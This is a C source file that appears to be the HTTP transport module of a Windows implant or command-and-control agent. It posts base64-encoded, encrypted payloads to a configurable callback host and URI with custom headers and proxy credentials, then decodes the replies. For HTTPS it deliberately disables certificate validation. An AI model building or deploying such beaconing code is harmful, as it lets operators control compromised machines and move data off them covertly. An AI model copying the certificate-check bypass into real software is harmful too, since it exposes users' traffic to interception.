#include "common.h"
#include "crypto.h"
#include "http.h"
#include <winhttp.h>

static wchar_t *widen(const char *s) {
    int n;
    wchar_t *w;
    if (!s)
        return NULL;
    n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (n <= 0)
        return NULL;
    w = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (!w)
        return NULL;
    if (MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n) <= 0) {
        free(w);
        return NULL;
    }
    return w;
}

/* Split "http(s)://host" (validated: no port, no path) into scheme + host. */
static int split_host(const char *url, int *secure, const char **host) {
    if (strncmp(url, "https://", 8) == 0) {
        *secure = 1;
        *host = url + 8;
        return 0;
    }
    if (strncmp(url, "http://", 7) == 0) {
        *secure = 0;
        *host = url + 7;
        return 0;
    }
    return -1;
}

int http_request(const agent_config_t *cfg, const char *host, int secure, int port,
                 const char *method, const char *path, const char *headers,
                 const unsigned char *body, size_t body_len,
                 unsigned char **resp_out, size_t *resp_len_out, int *status_out) {
    HINTERNET session = NULL, connect = NULL, req = NULL;
    wchar_t *w_host = NULL, *w_path = NULL, *w_proxy = NULL;
    wchar_t *w_proxy_user = NULL, *w_proxy_pass = NULL;
    wchar_t *w_method = NULL, *w_headers = NULL;
    int use_proxy = 0;
    DWORD flags, status = 0, status_len = sizeof(status);
    unsigned char *resp = NULL;
    size_t resp_len = 0, resp_cap = 0;
    int rc = -1;
    *resp_out = NULL;
    *resp_len_out = 0;
    *status_out = 0;
    w_host = widen(host);
    w_path = widen(path);
    w_method = widen(method);
    if (!w_host || !w_path || !w_method)
        goto done;
    if (headers && headers[0] != '\0') {
        w_headers = widen(headers);
        if (!w_headers)
            goto done;
    }
    use_proxy = cfg->proxy_host[0] != '\0';
    if (use_proxy) {
        char proxy[300];
        if (cfg->proxy_port[0] != '\0')
            snprintf(proxy, sizeof(proxy), "%s:%s", cfg->proxy_host, cfg->proxy_port);
        else
            snprintf(proxy, sizeof(proxy), "%s", cfg->proxy_host);
        w_proxy = widen(proxy);
        if (!w_proxy)
            goto done;
        if (cfg->proxy_user[0] != '\0') {
            w_proxy_user = widen(cfg->proxy_user);
            w_proxy_pass = widen(cfg->proxy_pass);
            if (!w_proxy_user || !w_proxy_pass)
                goto done;
        }
    }
    session = WinHttpOpen(NULL,
                          use_proxy ? WINHTTP_ACCESS_TYPE_NAMED_PROXY : WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          use_proxy ? w_proxy : WINHTTP_NO_PROXY_NAME,
                          WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session)
        goto done;
    WinHttpSetTimeouts(session, 10000, 10000, 15000, 30000);
    if (use_proxy && w_proxy_user) {
        WinHttpSetOption(session, WINHTTP_OPTION_PROXY_USERNAME, w_proxy_user,
                         (DWORD)(wcslen(w_proxy_user) * sizeof(wchar_t)));
        WinHttpSetOption(session, WINHTTP_OPTION_PROXY_PASSWORD, w_proxy_pass,
                         (DWORD)(wcslen(w_proxy_pass) * sizeof(wchar_t)));
    }
    connect = WinHttpConnect(session, w_host, (INTERNET_PORT)port, 0);
    if (!connect)
        goto done;
    flags = secure ? WINHTTP_FLAG_SECURE : 0;
    req = WinHttpOpenRequest(connect, w_method, w_path, NULL, WINHTTP_NO_REFERER,
                             WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!req)
        goto done;
    if (secure) {
        DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
    }
    if (!WinHttpSendRequest(req, w_headers ? w_headers : WINHTTP_NO_ADDITIONAL_HEADERS,
                            w_headers ? (DWORD)-1 : 0,
                            (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0))
        goto done;
    if (!WinHttpReceiveResponse(req, NULL))
        goto done;
    if (!WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             NULL, &status, &status_len, NULL))
        goto done;
    *status_out = (int)status;
    for (;;) {
        DWORD avail = 0, got = 0;
        if (!WinHttpQueryDataAvailable(req, &avail) || avail == 0)
            break;
        if (resp_len + avail + 1 > resp_cap) {
            size_t want = resp_len + avail + 1;
            unsigned char *grown = (unsigned char *)realloc(resp, want);
            if (!grown)
                goto done;
            resp = grown;
            resp_cap = want;
        }
        if (!WinHttpReadData(req, resp + resp_len, avail, &got) || got == 0)
            break;
        resp_len += got;
    }
    if (!resp) {
        resp = (unsigned char *)malloc(1);
        if (!resp)
            goto done;
        resp_cap = 1;
    }
    resp[resp_len] = '\0';
    *resp_out = resp;
    *resp_len_out = resp_len;
    resp = NULL;
    rc = 0;
done:
    free(resp);
    free(w_host);
    free(w_path);
    free(w_method);
    free(w_headers);
    free(w_proxy);
    free(w_proxy_user);
    free(w_proxy_pass);
    if (req)
        WinHttpCloseHandle(req);
    if (connect)
        WinHttpCloseHandle(connect);
    if (session)
        WinHttpCloseHandle(session);
    return rc;
}

int http_post(const agent_config_t *cfg, const char *body, char **resp_out) {
    char path[160];
    const char *host;
    char *hlines = NULL;
    size_t hlen = 0, hcap = 0;
    int secure = 0, status = 0, i, rc = -1;
    unsigned char *resp = NULL;
    size_t resp_len = 0;
    *resp_out = NULL;
    if (split_host(cfg->callback_host, &secure, &host) != 0)
        return -1;
    snprintf(path, sizeof(path), "/%s", cfg->post_uri);
    for (i = 0; i < cfg->header_count; i++) {
        char line[700];
        size_t n;
        snprintf(line, sizeof(line), "%s: %s\r\n", cfg->headers[i].name, cfg->headers[i].value);
        n = strlen(line);
        if (hlen + n + 1 > hcap) {
            size_t want = hlen + n + 1;
            char *grown = (char *)realloc(hlines, want);
            if (!grown)
                goto done;
            hlines = grown;
            hcap = want;
        }
        memcpy(hlines + hlen, line, n);
        hlen += n;
    }
    if (hlines)
        hlines[hlen] = '\0';
    if (http_request(cfg, host, secure, cfg->callback_port, "POST", path, hlines,
                     (const unsigned char *)body, strlen(body),
                     &resp, &resp_len, &status) != 0)
        goto done;
    if (status != 200)
        goto done;
    *resp_out = (char *)resp;
    resp = NULL;
    rc = 0;
done:
    free(hlines);
    free(resp);
    return rc;
}

int http_exchange(const agent_config_t *cfg, const unsigned char *sealed, size_t sealed_len,
                  unsigned char **out, size_t *out_len) {
    char *body = NULL, *resp = NULL;
    int rc = -1;
    *out = NULL;
    *out_len = 0;
    body = b64_encode(sealed, sealed_len, NULL);
    if (!body)
        return -1;
    if (http_post(cfg, body, &resp) != 0)
        goto done;
    *out = b64_decode(resp, out_len);
    rc = *out ? 0 : -1;
done:
    free(body);
    free(resp);
    return rc;
}
